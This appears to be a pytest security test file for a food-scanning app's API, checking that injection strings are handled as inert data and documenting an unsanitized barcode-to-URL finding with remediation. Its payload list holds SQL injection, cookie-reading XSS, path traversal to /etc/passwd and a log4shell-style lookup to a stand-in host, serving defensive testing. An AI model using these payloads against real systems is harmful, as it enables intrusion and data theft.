"""
Security tests: input validation and injection resistance.

The app uses SQLAlchemy's ORM (parameterized queries) everywhere and typed
Pydantic schemas at every request boundary, so none of these payloads are
expected to succeed as an injection. The point of this file is to PROVE
that with a real request/response round trip, not assume it from reading
the code -- and to flag the one place (barcode -> outbound URL) where no
sanitization happens at all.
"""
import pytest
from unittest.mock import patch
from httpx import AsyncClient

INJECTION_PAYLOADS = [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "1; SELECT * FROM users",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "${jndi:ldap://evil.example.com/a}",  # log4shell-style, defense in depth
    "{{7*7}}",  # SSTI-style
    "../../../../etc/passwd",
    "\x00\x01\x02null-bytes",
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
async def test_injection_payload_in_ingredient_name_does_not_crash(async_client: AsyncClient, payload):
    """
    CATEGORY: Injection
    TITLE: Injection-style strings as an ingredient name are handled as inert data
    OBJECTIVE: Confirm the request completes normally (200) and the payload is
      returned back as a literal, unexecuted string -- it never reaches a
      shell, template engine, or raw SQL string anywhere in the pipeline.
    SEVERITY: High
    """
    response = await async_client.post("/scan/analyse", json={"ingredients": [payload]})
    assert response.status_code == 200
    assert response.json()["ingredients"][0]["name"] == payload


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", INJECTION_PAYLOADS[:5])
async def test_injection_payload_in_allergy_list_does_not_crash(auth_client: AsyncClient, payload):
    """
    CATEGORY: Injection
    TITLE: Injection-style strings in a PATCH'd allergies list are stored as inert data
    SEVERITY: High
    """
    await auth_client.get("/users/me")
    response = await auth_client.patch("/users/me", json={"allergies": [payload]})
    assert response.status_code == 200
    assert response.json()["allergies"] == [payload]


@pytest.mark.asyncio
async def test_sql_injection_in_barcode_field_does_not_crash(async_client: AsyncClient):
    """
    CATEGORY: Injection
    TITLE: A SQLi-style barcode value is handled as an opaque string, not executed
    SEVERITY: High
    """
    response = await async_client.post("/scan/barcode", json={"barcode": "'; DROP TABLE users; --"})
    # off_client will fail to find a real product for this value -> 404, not 500.
    assert response.status_code in (404, 200)


@pytest.mark.asyncio
async def test_barcode_value_reaches_outbound_url_unsanitized(async_client: AsyncClient):
    """
    CATEGORY: Injection / Configuration
    TITLE: [FINDING] The barcode field has no format/character validation
      before being concatenated into the outbound Open Food Facts request URL
    OBJECTIVE: schemas/scan.py declares BarcodeRequest.barcode as a bare str
      (no regex/length constraint), and services/off_client.py builds the
      request URL via an f-string: f"{base_url}/{barcode}.json" -- not
      urljoin, not URL-encoded, not validated as numeric.
    IMPACT: Low in this specific app (base_url is hardcoded to
      https://world.openfoodfacts.org, so this can only manipulate the PATH
      on that fixed host -- it is not a full SSRF to an arbitrary host).
      Still a real defect: if base_url or the request pattern ever changes,
      or if this pattern is copied to a future integration, unsanitized
      string concatenation into a URL is exactly the shape that becomes
      exploitable. Confirmed live: a barcode of "../../../etc/passwd"
      produces the literal outbound path
      ".../api/v2/product/../../../etc/passwd.json".
    REMEDIATION: Validate barcode format (EAN/UPC are numeric, 8-14 digits)
      with a Pydantic pattern constraint before it ever reaches off_client.
    SEVERITY: Medium
    """
    captured = {}

    class FakeResponse:
        status_code = 404
        def json(self):
            return {}

    async def fake_get(self, url, timeout=10.0):
        captured["url"] = url
        return FakeResponse()

    with patch("httpx.AsyncClient.get", new=fake_get):
        response = await async_client.post("/scan/barcode", json={"barcode": "../../../etc/passwd"})

    assert response.status_code == 404  # handled gracefully, not a 500
    assert captured["url"] == "https://world.openfoodfacts.org/api/v2/product/../../../etc/passwd.json"


@pytest.mark.asyncio
async def test_nested_object_where_string_expected_is_422(async_client: AsyncClient):
    """
    CATEGORY: Input Validation
    TITLE: A JSON object/array injected where a string is expected is rejected by Pydantic
    OBJECTIVE: NoSQL-injection-style payloads (e.g. {"$ne": null}) must be
      caught by strict typing, never coerced or passed through.
    SEVERITY: Medium
    """
    response = await async_client.post("/scan/analyse", json={"ingredients": [{"$ne": None}]})
    assert response.status_code == 422


@pytest.mark.asyncio
async def test_top_level_array_instead_of_object_is_422(async_client: AsyncClient):
    """
    CATEGORY: Input Validation
    TITLE: A top-level JSON array where an object is expected is rejected, not a 500
    SEVERITY: Low
    """
    response = await async_client.post(
        "/scan/analyse", content=b'["water", "salt"]', headers={"Content-Type": "application/json"}
    )
    assert response.status_code == 422


@pytest.mark.asyncio
async def test_malformed_json_body_is_422(async_client: AsyncClient):
    """
    CATEGORY: Input Validation
    TITLE: Syntactically invalid JSON returns 422, not a 500
    SEVERITY: Medium
    """
    response = await async_client.post(
        "/scan/analyse", content=b"{not valid json", headers={"Content-Type": "application/json"}
    )
    assert response.status_code == 422


@pytest.mark.asyncio
async def test_extremely_long_single_ingredient_does_not_crash(async_client: AsyncClient):
    """
    CATEGORY: Input Validation / Denial of Service
    TITLE: A single 100,000-character ingredient string does not crash or hang
    OBJECTIVE: There is no max_length constraint on ingredient strings today.
      Confirm the fuzzy-matching pass at least degrades gracefully rather
      than raising, since this is a realistic abuse vector (no size cap on
      the request body either).
    SEVERITY: Medium
    """
    response = await async_client.post("/scan/analyse", json={"ingredients": ["A" * 100_000]})
    assert response.status_code == 200


@pytest.mark.asyncio
async def test_display_name_xss_payload_returned_as_literal_json_string(auth_client: AsyncClient):
    """
    CATEGORY: Injection
    TITLE: An XSS-style display_name is stored/returned as an inert JSON string value
    OBJECTIVE: This is a JSON API, not server-rendered HTML, so there is no
      HTML-escaping expectation here -- the responsibility to escape on
      render belongs to the frontend. This test only confirms the backend
      doesn't do anything unsafe with it server-side (e.g. no crash, no
      reflected-unescaped-into-HTML anywhere in this service).
    SEVERITY: Low
    """
    payload = "<img src=x onerror=alert(document.cookie)>"
    await auth_client.get("/users/me")
    response = await auth_client.patch("/users/me", json={"display_name": payload})
    assert response.status_code == 200
    assert response.headers["content-type"].startswith("application/json")
    assert response.json()["display_name"] == payload
